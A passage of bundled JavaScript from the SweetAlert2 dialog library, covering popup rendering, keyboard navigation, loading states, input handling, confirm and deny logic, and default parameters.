          for (const sel of [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]) {
            setStyle(icon2, sel, "background-color", params.iconColor);
          }
          setStyle(icon2, ".swal2-success-ring", "border-color", params.iconColor);
        };
        const iconContent = (content) => `<div class="${swalClasses["icon-content"]}">${content}</div>`;
        const renderImage = (instance, params) => {
          const image = getImage();
          if (!image) {
            return;
          }
          if (!params.imageUrl) {
            hide(image);
            return;
          }
          show(image, "");
          image.setAttribute("src", params.imageUrl);
          image.setAttribute("alt", params.imageAlt || "");
          applyNumericalStyle(image, "width", params.imageWidth);
          applyNumericalStyle(image, "height", params.imageHeight);
          image.className = swalClasses.image;
          applyCustomClass(image, params, "image");
        };
        const renderPopup = (instance, params) => {
          const container = getContainer();
          const popup = getPopup();
          if (!container || !popup) {
            return;
          }
          if (params.toast) {
            applyNumericalStyle(container, "width", params.width);
            popup.style.width = "100%";
            const loader = getLoader();
            if (loader) {
              popup.insertBefore(loader, getIcon());
            }
          } else {
            applyNumericalStyle(popup, "width", params.width);
          }
          applyNumericalStyle(popup, "padding", params.padding);
          if (params.color) {
            popup.style.color = params.color;
          }
          if (params.background) {
            popup.style.background = params.background;
          }
          hide(getValidationMessage());
          addClasses$1(popup, params);
        };
        const addClasses$1 = (popup, params) => {
          const showClass = params.showClass || {};
          popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? showClass.popup : ""}`;
          if (params.toast) {
            addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
            addClass(popup, swalClasses.toast);
          } else {
            addClass(popup, swalClasses.modal);
          }
          applyCustomClass(popup, params, "popup");
          if (typeof params.customClass === "string") {
            addClass(popup, params.customClass);
          }
          if (params.icon) {
            addClass(popup, swalClasses[`icon-${params.icon}`]);
          }
        };
        const renderProgressSteps = (instance, params) => {
          const progressStepsContainer = getProgressSteps();
          if (!progressStepsContainer) {
            return;
          }
          const {
            progressSteps,
            currentProgressStep
          } = params;
          if (!progressSteps || progressSteps.length === 0 || currentProgressStep === void 0) {
            hide(progressStepsContainer);
            return;
          }
          show(progressStepsContainer);
          progressStepsContainer.textContent = "";
          if (currentProgressStep >= progressSteps.length) {
            warn2("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
          }
          progressSteps.forEach((step, index) => {
            const stepEl = createStepElement(step);
            progressStepsContainer.appendChild(stepEl);
            if (index === currentProgressStep) {
              addClass(stepEl, swalClasses["active-progress-step"]);
            }
            if (index !== progressSteps.length - 1) {
              const lineEl = createLineElement(params);
              progressStepsContainer.appendChild(lineEl);
            }
          });
        };
        const createStepElement = (step) => {
          const stepEl = document.createElement("li");
          addClass(stepEl, swalClasses["progress-step"]);
          setInnerHtml(stepEl, step);
          return stepEl;
        };
        const createLineElement = (params) => {
          const lineEl = document.createElement("li");
          addClass(lineEl, swalClasses["progress-step-line"]);
          if (params.progressStepsDistance) {
            applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
          }
          return lineEl;
        };
        const renderTitle = (instance, params) => {
          const title = getTitle();
          if (!title) {
            return;
          }
          showWhenInnerHtmlPresent(title);
          toggle(title, params.title || params.titleText, "block");
          if (params.title) {
            parseHtmlToContainer(params.title, title);
          }
          if (params.titleText) {
            title.innerText = params.titleText;
          }
          applyCustomClass(title, params, "title");
        };
        const render2 = (instance, params) => {
          renderPopup(instance, params);
          renderContainer(instance, params);
          renderProgressSteps(instance, params);
          renderIcon(instance, params);
          renderImage(instance, params);
          renderTitle(instance, params);
          renderCloseButton(instance, params);
          renderContent(instance, params);
          renderActions(instance, params);
          renderFooter(instance, params);
          const popup = getPopup();
          if (typeof params.didRender === "function" && popup) {
            params.didRender(popup);
          }
        };
        const isVisible = () => {
          return isVisible$1(getPopup());
        };
        const clickConfirm = () => {
          var _dom$getConfirmButton;
          return (_dom$getConfirmButton = getConfirmButton()) === null || _dom$getConfirmButton === void 0 ? void 0 : _dom$getConfirmButton.click();
        };
        const clickDeny = () => {
          var _dom$getDenyButton;
          return (_dom$getDenyButton = getDenyButton()) === null || _dom$getDenyButton === void 0 ? void 0 : _dom$getDenyButton.click();
        };
        const clickCancel = () => {
          var _dom$getCancelButton;
          return (_dom$getCancelButton = getCancelButton()) === null || _dom$getCancelButton === void 0 ? void 0 : _dom$getCancelButton.click();
        };
        const DismissReason = Object.freeze({
          cancel: "cancel",
          backdrop: "backdrop",
          close: "close",
          esc: "esc",
          timer: "timer"
        });
        const removeKeydownHandler = (globalState2) => {
          if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
            globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
              capture: globalState2.keydownListenerCapture
            });
            globalState2.keydownHandlerAdded = false;
          }
        };
        const addKeydownHandler = (globalState2, innerParams, dismissWith) => {
          removeKeydownHandler(globalState2);
          if (!innerParams.toast) {
            globalState2.keydownHandler = (e) => keydownHandler(innerParams, e, dismissWith);
            globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
            globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
            globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
              capture: globalState2.keydownListenerCapture
            });
            globalState2.keydownHandlerAdded = true;
          }
        };
        const setFocus = (index, increment) => {
          var _dom$getPopup;
          const focusableElements = getFocusableElements();
          if (focusableElements.length) {
            index = index + increment;
            if (index === focusableElements.length) {
              index = 0;
            } else if (index === -1) {
              index = focusableElements.length - 1;
            }
            focusableElements[index].focus();
            return;
          }
          (_dom$getPopup = getPopup()) === null || _dom$getPopup === void 0 || _dom$getPopup.focus();
        };
        const arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
        const arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
        const keydownHandler = (innerParams, event, dismissWith) => {
          if (!innerParams) {
            return;
          }
          if (event.isComposing || event.keyCode === 229) {
            return;
          }
          if (innerParams.stopKeydownPropagation) {
            event.stopPropagation();
          }
          if (event.key === "Enter") {
            handleEnter(event, innerParams);
          } else if (event.key === "Tab") {
            handleTab(event);
          } else if ([...arrowKeysNextButton, ...arrowKeysPreviousButton].includes(event.key)) {
            handleArrows(event.key);
          } else if (event.key === "Escape") {
            handleEsc(event, innerParams, dismissWith);
          }
        };
        const handleEnter = (event, innerParams) => {
          if (!callIfFunction(innerParams.allowEnterKey)) {
            return;
          }
          const input = getInput$1(getPopup(), innerParams.input);
          if (event.target && input && event.target instanceof HTMLElement && event.target.outerHTML === input.outerHTML) {
            if (["textarea", "file"].includes(innerParams.input)) {
              return;
            }
            clickConfirm();
            event.preventDefault();
          }
        };
        const handleTab = (event) => {
          const targetElement = event.target;
          const focusableElements = getFocusableElements();
          let btnIndex = -1;
          for (let i = 0; i < focusableElements.length; i++) {
            if (targetElement === focusableElements[i]) {
              btnIndex = i;
              break;
            }
          }
          if (!event.shiftKey) {
            setFocus(btnIndex, 1);
          } else {
            setFocus(btnIndex, -1);
          }
          event.stopPropagation();
          event.preventDefault();
        };
        const handleArrows = (key) => {
          const actions = getActions();
          const confirmButton = getConfirmButton();
          const denyButton = getDenyButton();
          const cancelButton = getCancelButton();
          if (!actions || !confirmButton || !denyButton || !cancelButton) {
            return;
          }
          const buttons = [confirmButton, denyButton, cancelButton];
          if (document.activeElement instanceof HTMLElement && !buttons.includes(document.activeElement)) {
            return;
          }
          const sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
          let buttonToFocus = document.activeElement;
          if (!buttonToFocus) {
            return;
          }
          for (let i = 0; i < actions.children.length; i++) {
            buttonToFocus = buttonToFocus[sibling];
            if (!buttonToFocus) {
              return;
            }
            if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
              break;
            }
          }
          if (buttonToFocus instanceof HTMLButtonElement) {
            buttonToFocus.focus();
          }
        };
        const handleEsc = (event, innerParams, dismissWith) => {
          if (callIfFunction(innerParams.allowEscapeKey)) {
            event.preventDefault();
            dismissWith(DismissReason.esc);
          }
        };
        var privateMethods = {
          swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
          swalPromiseReject: /* @__PURE__ */ new WeakMap()
        };
        const setAriaHidden = () => {
          const container = getContainer();
          const bodyChildren = Array.from(document.body.children);
          bodyChildren.forEach((el) => {
            if (el.contains(container)) {
              return;
            }
            if (el.hasAttribute("aria-hidden")) {
              el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden") || "");
            }
            el.setAttribute("aria-hidden", "true");
          });
        };
        const unsetAriaHidden = () => {
          const bodyChildren = Array.from(document.body.children);
          bodyChildren.forEach((el) => {
            if (el.hasAttribute("data-previous-aria-hidden")) {
              el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden") || "");
              el.removeAttribute("data-previous-aria-hidden");
            } else {
              el.removeAttribute("aria-hidden");
            }
          });
        };
        const isSafariOrIOS = typeof window !== "undefined" && !!window.GestureEvent;
        const iOSfix = () => {
          if (isSafariOrIOS && !hasClass(document.body, swalClasses.iosfix)) {
            const offset = document.body.scrollTop;
            document.body.style.top = `${offset * -1}px`;
            addClass(document.body, swalClasses.iosfix);
            lockBodyScroll();
          }
        };
        const lockBodyScroll = () => {
          const container = getContainer();
          if (!container) {
            return;
          }
          let preventTouchMove;
          container.ontouchstart = (event) => {
            preventTouchMove = shouldPreventTouchMove(event);
          };
          container.ontouchmove = (event) => {
            if (preventTouchMove) {
              event.preventDefault();
              event.stopPropagation();
            }
          };
        };
        const shouldPreventTouchMove = (event) => {
          const target = event.target;
          const container = getContainer();
          const htmlContainer = getHtmlContainer();
          if (!container || !htmlContainer) {
            return false;
          }
          if (isStylus(event) || isZoom(event)) {
            return false;
          }
          if (target === container) {
            return true;
          }
          if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
          target.tagName !== "TEXTAREA" && // #2266
          !(isScrollable(htmlContainer) && // #1944
          htmlContainer.contains(target))) {
            return true;
          }
          return false;
        };
        const isStylus = (event) => {
          return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
        };
        const isZoom = (event) => {
          return event.touches && event.touches.length > 1;
        };
        const undoIOSfix = () => {
          if (hasClass(document.body, swalClasses.iosfix)) {
            const offset = parseInt(document.body.style.top, 10);
            removeClass(document.body, swalClasses.iosfix);
            document.body.style.top = "";
            document.body.scrollTop = offset * -1;
          }
        };
        const measureScrollbar = () => {
          const scrollDiv = document.createElement("div");
          scrollDiv.className = swalClasses["scrollbar-measure"];
          document.body.appendChild(scrollDiv);
          const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
          document.body.removeChild(scrollDiv);
          return scrollbarWidth;
        };
        let previousBodyPadding = null;
        const replaceScrollbarWithPadding = (initialBodyOverflow) => {
          if (previousBodyPadding !== null) {
            return;
          }
          if (document.body.scrollHeight > window.innerHeight || initialBodyOverflow === "scroll") {
            previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
            document.body.style.paddingRight = `${previousBodyPadding + measureScrollbar()}px`;
          }
        };
        const undoReplaceScrollbarWithPadding = () => {
          if (previousBodyPadding !== null) {
            document.body.style.paddingRight = `${previousBodyPadding}px`;
            previousBodyPadding = null;
          }
        };
        function removePopupAndResetState(instance, container, returnFocus, didClose) {
          if (isToast()) {
            triggerDidCloseAndDispose(instance, didClose);
          } else {
            restoreActiveElement(returnFocus).then(() => triggerDidCloseAndDispose(instance, didClose));
            removeKeydownHandler(globalState);
          }
          if (isSafariOrIOS) {
            container.setAttribute("style", "display:none !important");
            container.removeAttribute("class");
            container.innerHTML = "";
          } else {
            container.remove();
          }
          if (isModal()) {
            undoReplaceScrollbarWithPadding();
            undoIOSfix();
            unsetAriaHidden();
          }
          removeBodyClasses();
        }
        function removeBodyClasses() {
          removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
        }
        function close(resolveValue) {
          resolveValue = prepareResolveValue(resolveValue);
          const swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
          const didClose = triggerClosePopup(this);
          if (this.isAwaitingPromise) {
            if (!resolveValue.isDismissed) {
              handleAwaitingPromise(this);
              swalPromiseResolve(resolveValue);
            }
          } else if (didClose) {
            swalPromiseResolve(resolveValue);
          }
        }
        const triggerClosePopup = (instance) => {
          const popup = getPopup();
          if (!popup) {
            return false;
          }
          const innerParams = privateProps.innerParams.get(instance);
          if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
            return false;
          }
          removeClass(popup, innerParams.showClass.popup);
          addClass(popup, innerParams.hideClass.popup);
          const backdrop = getContainer();
          removeClass(backdrop, innerParams.showClass.backdrop);
          addClass(backdrop, innerParams.hideClass.backdrop);
          handlePopupAnimation(instance, popup, innerParams);
          return true;
        };
        function rejectPromise(error3) {
          const rejectPromise2 = privateMethods.swalPromiseReject.get(this);
          handleAwaitingPromise(this);
          if (rejectPromise2) {
            rejectPromise2(error3);
          }
        }
        const handleAwaitingPromise = (instance) => {
          if (instance.isAwaitingPromise) {
            delete instance.isAwaitingPromise;
            if (!privateProps.innerParams.get(instance)) {
              instance._destroy();
            }
          }
        };
        const prepareResolveValue = (resolveValue) => {
          if (typeof resolveValue === "undefined") {
            return {
              isConfirmed: false,
              isDenied: false,
              isDismissed: true
            };
          }
          return Object.assign({
            isConfirmed: false,
            isDenied: false,
            isDismissed: false
          }, resolveValue);
        };
        const handlePopupAnimation = (instance, popup, innerParams) => {
          const container = getContainer();
          const animationIsSupported = animationEndEvent && hasCssAnimation(popup);
          if (typeof innerParams.willClose === "function") {
            innerParams.willClose(popup);
          }
          if (animationIsSupported) {
            animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
          } else {
            removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
          }
        };
        const animatePopup = (instance, popup, container, returnFocus, didClose) => {
          if (!animationEndEvent) {
            return;
          }
          globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
          popup.addEventListener(animationEndEvent, function(e) {
            if (e.target === popup) {
              globalState.swalCloseEventFinishedCallback();
              delete globalState.swalCloseEventFinishedCallback;
            }
          });
        };
        const triggerDidCloseAndDispose = (instance, didClose) => {
          setTimeout(() => {
            if (typeof didClose === "function") {
              didClose.bind(instance.params)();
            }
            if (instance._destroy) {
              instance._destroy();
            }
          });
        };
        const showLoading = (buttonToReplace) => {
          let popup = getPopup();
          if (!popup) {
            new Swal2();
          }
          popup = getPopup();
          if (!popup) {
            return;
          }
          const loader = getLoader();
          if (isToast()) {
            hide(getIcon());
          } else {
            replaceButton(popup, buttonToReplace);
          }
          show(loader);
          popup.setAttribute("data-loading", "true");
          popup.setAttribute("aria-busy", "true");
          popup.focus();
        };
        const replaceButton = (popup, buttonToReplace) => {
          const actions = getActions();
          const loader = getLoader();
          if (!actions || !loader) {
            return;
          }
          if (!buttonToReplace && isVisible$1(getConfirmButton())) {
            buttonToReplace = getConfirmButton();
          }
          show(actions);
          if (buttonToReplace) {
            hide(buttonToReplace);
            loader.setAttribute("data-button-to-replace", buttonToReplace.className);
            actions.insertBefore(loader, buttonToReplace);
          }
          addClass([popup, actions], swalClasses.loading);
        };
        const handleInputOptionsAndValue = (instance, params) => {
          if (params.input === "select" || params.input === "radio") {
            handleInputOptions(instance, params);
          } else if (["text", "email", "number", "tel", "textarea"].some((i) => i === params.input) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
            showLoading(getConfirmButton());
            handleInputValue(instance, params);
          }
        };
        const getInputValue2 = (instance, innerParams) => {
          const input = instance.getInput();
          if (!input) {
            return null;
          }
          switch (innerParams.input) {
            case "checkbox":
              return getCheckboxValue(input);
            case "radio":
              return getRadioValue(input);
            case "file":
              return getFileValue(input);
            default:
              return innerParams.inputAutoTrim ? input.value.trim() : input.value;
          }
        };
        const getCheckboxValue = (input) => input.checked ? 1 : 0;
        const getRadioValue = (input) => input.checked ? input.value : null;
        const getFileValue = (input) => input.files && input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
        const handleInputOptions = (instance, params) => {
          const popup = getPopup();
          if (!popup) {
            return;
          }
          const processInputOptions = (inputOptions) => {
            if (params.input === "select") {
              populateSelectOptions(popup, formatInputOptions(inputOptions), params);
            } else if (params.input === "radio") {
              populateRadioOptions(popup, formatInputOptions(inputOptions), params);
            }
          };
          if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
            showLoading(getConfirmButton());
            asPromise(params.inputOptions).then((inputOptions) => {
              instance.hideLoading();
              processInputOptions(inputOptions);
            });
          } else if (typeof params.inputOptions === "object") {
            processInputOptions(params.inputOptions);
          } else {
            error2(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
          }
        };
        const handleInputValue = (instance, params) => {
          const input = instance.getInput();
          if (!input) {
            return;
          }
          hide(input);
          asPromise(params.inputValue).then((inputValue) => {
            input.value = params.input === "number" ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
            show(input);
            input.focus();
            instance.hideLoading();
          }).catch((err) => {
            error2(`Error in inputValue promise: ${err}`);
            input.value = "";
            show(input);
            input.focus();
            instance.hideLoading();
          });
        };
        function populateSelectOptions(popup, inputOptions, params) {
          const select = getDirectChildByClass(popup, swalClasses.select);
          if (!select) {
            return;
          }
          const renderOption = (parent, optionLabel, optionValue) => {
            const option = document.createElement("option");
            option.value = optionValue;
            setInnerHtml(option, optionLabel);
            option.selected = isSelected(optionValue, params.inputValue);
            parent.appendChild(option);
          };
          inputOptions.forEach((inputOption) => {
            const optionValue = inputOption[0];
            const optionLabel = inputOption[1];
            if (Array.isArray(optionLabel)) {
              const optgroup = document.createElement("optgroup");
              optgroup.label = optionValue;
              optgroup.disabled = false;
              select.appendChild(optgroup);
              optionLabel.forEach((o2) => renderOption(optgroup, o2[1], o2[0]));
            } else {
              renderOption(select, optionLabel, optionValue);
            }
          });
          select.focus();
        }
        function populateRadioOptions(popup, inputOptions, params) {
          const radio = getDirectChildByClass(popup, swalClasses.radio);
          if (!radio) {
            return;
          }
          inputOptions.forEach((inputOption) => {
            const radioValue = inputOption[0];
            const radioLabel = inputOption[1];
            const radioInput = document.createElement("input");
            const radioLabelElement = document.createElement("label");
            radioInput.type = "radio";
            radioInput.name = swalClasses.radio;
            radioInput.value = radioValue;
            if (isSelected(radioValue, params.inputValue)) {
              radioInput.checked = true;
            }
            const label = document.createElement("span");
            setInnerHtml(label, radioLabel);
            label.className = swalClasses.label;
            radioLabelElement.appendChild(radioInput);
            radioLabelElement.appendChild(label);
            radio.appendChild(radioLabelElement);
          });
          const radios = radio.querySelectorAll("input");
          if (radios.length) {
            radios[0].focus();
          }
        }
        const formatInputOptions = (inputOptions) => {
          const result = [];
          if (inputOptions instanceof Map) {
            inputOptions.forEach((value, key) => {
              let valueFormatted = value;
              if (typeof valueFormatted === "object") {
                valueFormatted = formatInputOptions(valueFormatted);
              }
              result.push([key, valueFormatted]);
            });
          } else {
            Object.keys(inputOptions).forEach((key) => {
              let valueFormatted = inputOptions[key];
              if (typeof valueFormatted === "object") {
                valueFormatted = formatInputOptions(valueFormatted);
              }
              result.push([key, valueFormatted]);
            });
          }
          return result;
        };
        const isSelected = (optionValue, inputValue) => {
          return !!inputValue && inputValue.toString() === optionValue.toString();
        };
        const handleConfirmButtonClick = (instance) => {
          const innerParams = privateProps.innerParams.get(instance);
          instance.disableButtons();
          if (innerParams.input) {
            handleConfirmOrDenyWithInput(instance, "confirm");
          } else {
            confirm2(instance, true);
          }
        };
        const handleDenyButtonClick = (instance) => {
          const innerParams = privateProps.innerParams.get(instance);
          instance.disableButtons();
          if (innerParams.returnInputValueOnDeny) {
            handleConfirmOrDenyWithInput(instance, "deny");
          } else {
            deny(instance, false);
          }
        };
        const handleCancelButtonClick = (instance, dismissWith) => {
          instance.disableButtons();
          dismissWith(DismissReason.cancel);
        };
        const handleConfirmOrDenyWithInput = (instance, type) => {
          const innerParams = privateProps.innerParams.get(instance);
          if (!innerParams.input) {
            error2(`The "input" parameter is needed to be set when using returnInputValueOn${capitalizeFirstLetter(type)}`);
            return;
          }
          const input = instance.getInput();
          const inputValue = getInputValue2(instance, innerParams);
          if (innerParams.inputValidator) {
            handleInputValidator(instance, inputValue, type);
          } else if (input && !input.checkValidity()) {
            instance.enableButtons();
            instance.showValidationMessage(innerParams.validationMessage || input.validationMessage);
          } else if (type === "deny") {
            deny(instance, inputValue);
          } else {
            confirm2(instance, inputValue);
          }
        };
        const handleInputValidator = (instance, inputValue, type) => {
          const innerParams = privateProps.innerParams.get(instance);
          instance.disableInput();
          const validationPromise = Promise.resolve().then(() => asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage)));
          validationPromise.then((validationMessage) => {
            instance.enableButtons();
            instance.enableInput();
            if (validationMessage) {
              instance.showValidationMessage(validationMessage);
            } else if (type === "deny") {
              deny(instance, inputValue);
            } else {
              confirm2(instance, inputValue);
            }
          });
        };
        const deny = (instance, value) => {
          const innerParams = privateProps.innerParams.get(instance || void 0);
          if (innerParams.showLoaderOnDeny) {
            showLoading(getDenyButton());
          }
          if (innerParams.preDeny) {
            instance.isAwaitingPromise = true;
            const preDenyPromise = Promise.resolve().then(() => asPromise(innerParams.preDeny(value, innerParams.validationMessage)));
            preDenyPromise.then((preDenyValue) => {
              if (preDenyValue === false) {
                instance.hideLoading();
                handleAwaitingPromise(instance);
              } else {
                instance.close({
                  isDenied: true,
                  value: typeof preDenyValue === "undefined" ? value : preDenyValue
                });
              }
            }).catch((error3) => rejectWith(instance || void 0, error3));
          } else {
            instance.close({
              isDenied: true,
              value
            });
          }
        };
        const succeedWith = (instance, value) => {
          instance.close({
            isConfirmed: true,
            value
          });
        };
        const rejectWith = (instance, error3) => {
          instance.rejectPromise(error3);
        };
        const confirm2 = (instance, value) => {
          const innerParams = privateProps.innerParams.get(instance || void 0);
          if (innerParams.showLoaderOnConfirm) {
            showLoading();
          }
          if (innerParams.preConfirm) {
            instance.resetValidationMessage();
            instance.isAwaitingPromise = true;
            const preConfirmPromise = Promise.resolve().then(() => asPromise(innerParams.preConfirm(value, innerParams.validationMessage)));
            preConfirmPromise.then((preConfirmValue) => {
              if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
                instance.hideLoading();
                handleAwaitingPromise(instance);
              } else {
                succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
              }
            }).catch((error3) => rejectWith(instance || void 0, error3));
          } else {
            succeedWith(instance, value);
          }
        };
        function hideLoading() {
          const innerParams = privateProps.innerParams.get(this);
          if (!innerParams) {
            return;
          }
          const domCache = privateProps.domCache.get(this);
          hide(domCache.loader);
          if (isToast()) {
            if (innerParams.icon) {
              show(getIcon());
            }
          } else {
            showRelatedButton(domCache);
          }
          removeClass([domCache.popup, domCache.actions], swalClasses.loading);
          domCache.popup.removeAttribute("aria-busy");
          domCache.popup.removeAttribute("data-loading");
          domCache.confirmButton.disabled = false;
          domCache.denyButton.disabled = false;
          domCache.cancelButton.disabled = false;
        }
        const showRelatedButton = (domCache) => {
          const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
          if (buttonToReplace.length) {
            show(buttonToReplace[0], "inline-block");
          } else if (allButtonsAreHidden()) {
            hide(domCache.actions);
          }
        };
        function getInput() {
          const innerParams = privateProps.innerParams.get(this);
          const domCache = privateProps.domCache.get(this);
          if (!domCache) {
            return null;
          }
          return getInput$1(domCache.popup, innerParams.input);
        }
        function setButtonsDisabled(instance, buttons, disabled2) {
          const domCache = privateProps.domCache.get(instance);
          buttons.forEach((button) => {
            domCache[button].disabled = disabled2;
          });
        }
        function setInputDisabled(input, disabled2) {
          const popup = getPopup();
          if (!popup || !input) {
            return;
          }
          if (input.type === "radio") {
            const radios = popup.querySelectorAll(`[name="${swalClasses.radio}"]`);
            for (let i = 0; i < radios.length; i++) {
              radios[i].disabled = disabled2;
            }
          } else {
            input.disabled = disabled2;
          }
        }
        function enableButtons() {
          setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
        }
        function disableButtons() {
          setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
        }
        function enableInput() {
          setInputDisabled(this.getInput(), false);
        }
        function disableInput() {
          setInputDisabled(this.getInput(), true);
        }
        function showValidationMessage(error3) {
          const domCache = privateProps.domCache.get(this);
          const params = privateProps.innerParams.get(this);
          setInnerHtml(domCache.validationMessage, error3);
          domCache.validationMessage.className = swalClasses["validation-message"];
          if (params.customClass && params.customClass.validationMessage) {
            addClass(domCache.validationMessage, params.customClass.validationMessage);
          }
          show(domCache.validationMessage);
          const input = this.getInput();
          if (input) {
            input.setAttribute("aria-invalid", "true");
            input.setAttribute("aria-describedby", swalClasses["validation-message"]);
            focusInput(input);
            addClass(input, swalClasses.inputerror);
          }
        }
        function resetValidationMessage() {
          const domCache = privateProps.domCache.get(this);
          if (domCache.validationMessage) {
            hide(domCache.validationMessage);
          }
          const input = this.getInput();
          if (input) {
            input.removeAttribute("aria-invalid");
            input.removeAttribute("aria-describedby");
            removeClass(input, swalClasses.inputerror);
          }
        }
        const defaultParams = {
          title: "",
          titleText: "",
          text: "",
          html: "",
          footer: "",
          icon: void 0,
          iconColor: void 0,
          iconHtml: void 0,
          template: void 0,
          toast: false,
          animation: true,
          showClass: {
            popup: "swal2-show",
            backdrop: "swal2-backdrop-show",
            icon: "swal2-icon-show"
          },
          hideClass: {
            popup: "swal2-hide",
            backdrop: "swal2-backdrop-hide",
            icon: "swal2-icon-hide"
          },
          customClass: {},
          target: "body",
          color: void 0,
          backdrop: true,
          heightAuto: true,
          allowOutsideClick: true,
          allowEscapeKey: true,
          allowEnterKey: true,
          stopKeydownPropagation: true,
          keydownListenerCapture: false,
          showConfirmButton: true,
          showDenyButton: false,
          showCancelButton: false,
          preConfirm: void 0,
          preDeny: void 0,
          confirmButtonText: "OK",
          confirmButtonAriaLabel: "",
          confirmButtonColor: void 0,
          denyButtonText: "No",
          denyButtonAriaLabel: "",
          denyButtonColor: void 0,
          cancelButtonText: "Cancel",
          cancelButtonAriaLabel: "",
          cancelButtonColor: void 0,
          buttonsStyling: true,
          reverseButtons: false,
          focusConfirm: true,
          focusDeny: false,
          focusCancel: false,
          returnFocus: true,
          showCloseButton: false,
          closeButtonHtml: "&times;",
          closeButtonAriaLabel: "Close this dialog",
          loaderHtml: "",
          showLoaderOnConfirm: false,
          showLoaderOnDeny: false,
          imageUrl: void 0,
          imageWidth: void 0,
          imageHeight: void 0,
          imageAlt: "",
          timer: void 0,
          timerProgressBar: false,
          width: void 0,
          padding: void 0,
          background: void 0,
          input: void 0,
          inputPlaceholder: "",
          inputLabel: "",
          inputValue: "",
          inputOptions: {},
          inputAutoFocus: true,
          inputAutoTrim: true,
          inputAttributes: {},
          inputValidator: void 0,
          returnInputValueOnDeny: false,
          validationMessage: void 0,
          grow: false,
          position: "center",
          progressSteps: [],
          currentProgressStep: void 0,
          progressStepsDistance: void 0,
          willOpen: void 0,
          didOpen: void 0,
          didRender: void 0,
          willClose: void 0,
          didClose: void 0,
          didDestroy: void 0,
          scrollbarPadding: true
        };
        const updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
        const deprecatedParams = {
          allowEnterKey: void 0
        };
        const toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
        const isValidParameter = (paramName) => {
          return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
        };
        const isUpdatableParameter = (paramName) => {
          return updatableParams.indexOf(paramName) !== -1;
        };
        const isDeprecatedParameter = (paramName) => {
          return deprecatedParams[paramName];
        };
        const checkIfParamIsValid = (param) => {
          if (!isValidParameter(param)) {
            warn2(`Unknown parameter "${param}"`);
          }
        };
        const checkIfToastParamIsValid = (param) => {
          if (toastIncompatibleParams.includes(param)) {
            warn2(`The parameter "${param}" is incompatible with toasts`);
          }
        };
        const checkIfParamIsDeprecated = (param) => {
          const isDeprecated = isDeprecatedParameter(param);
          if (isDeprecated) {
            warnAboutDeprecation(param, isDeprecated);
          }
        };
        const showWarningsForParams = (params) => {
          if (params.backdrop === false && params.allowOutsideClick) {
            warn2('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
          }
          for (const param in params) {
            checkIfParamIsValid(param);
            if (params.toast) {
              checkIfToastParamIsValid(param);
            }
            checkIfParamIsDeprecated(param);
          }
        };
        function update(params) {
          const popup = getPopup();
          const innerParams = privateProps.innerParams.get(this);
          if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
            warn2(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
            return;
          }
          const validUpdatableParams = filterValidParams(params);
          const updatedParams = Object.assign({}, innerParams, validUpdatableParams);
          render2(this, updatedParams);
          privateProps.innerParams.set(this, updatedParams);
          Object.defineProperties(this, {
            params: {
              value: Object.assign({}, this.params, params),
              writable: false,
              enumerable: true
            }
          });
        }
